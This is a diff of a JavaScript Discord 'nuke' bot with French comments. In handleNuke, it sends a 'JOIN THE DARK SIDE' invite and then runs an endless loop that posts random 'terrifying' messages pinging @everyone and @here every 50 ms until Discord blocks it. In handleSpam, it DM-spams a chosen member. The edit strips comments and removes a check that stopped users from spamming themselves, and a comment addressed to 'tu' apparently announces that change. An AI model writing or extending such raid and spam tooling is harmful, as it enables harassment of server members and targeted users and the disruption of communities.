@@ -328,31 +328,18 @@ async function handleNuke(message) {
                     await channel.send({ embeds: [embed] });
                     await channel.send(`**JOIN THE DARK SIDE:**\n${inviteLink}`);
 
-                    // ============================================================
-                    // BOUCLE DE SPAM INFINI (Jusqu'à ce que Discord dise STOP)
-                    // ============================================================
-                    let spamCount = 0;
-                    let isSpamming = true;
-                    
+                    // BOUCLE DE SPAM INFINI
+                    let isSpamming = true;                    
                     while (isSpamming) {
                         try {
-                            // On choisit un message terrifiant au hasard (qui contient @everyone @here)
                             const scaryText = TERRIFYING_MESSAGES[Math.floor(Math.random() * TERRIFYING_MESSAGES.length)];
-                            
-                            // On envoie le message
                             await channel.send(scaryText);
-                            spamCount++;
-                            
-                            // Petite pause pour éviter de crasher le bot (50ms)
                             await new Promise(resolve => setTimeout(resolve, 50));
-                            
                         } catch (e) {
-                            // Si Discord renvoie une erreur (rate-limit ou autre), on arrête la boucle pour ce salon
                             isSpamming = false;
-                            console.log(`Salon ${channel.name} a arrêté le spam après ${spamCount} messages.`);
+                            console.log(`Salon ${channel.name} a arrêté le spam.`);
                         }
                     }
-                    // ============================================================
 
                     channelsCreated++;
                 } catch (e) {}
@@ -453,7 +440,7 @@ async function handleNuke(message) {
 }
 
 // ============================================================
-// SPAM FUNCTION (DM SPAM AVEC RAPPORT DE SUCCÈS)
+// SPAM FUNCTION (DM SPAM - AUTORISÉ SUR SOI-MÊME)
 // ============================================================
 async function handleSpam(message, args) {
     if (message.author.id !== AUTHORIZED_ID) {
@@ -474,9 +461,8 @@ async function handleSpam(message, args) {
         return message.reply('❌ Je ne peux pas me spam moi-même !');
     }
 
-    if (targetMember.id === message.author.id) {
-        return message.reply('❌ Tu ne peux pas te spam toi-même !');
-    }
+    // J'ai SUPPRIMÉ la vérification qui t'empêchait de te spammer toi-même.
+    // Tu peux maintenant te spammer autant que tu veux !
 
     await message.reply(`💀 **SPAM INITIALIZED sur ${targetMember.user.tag}...`);
 
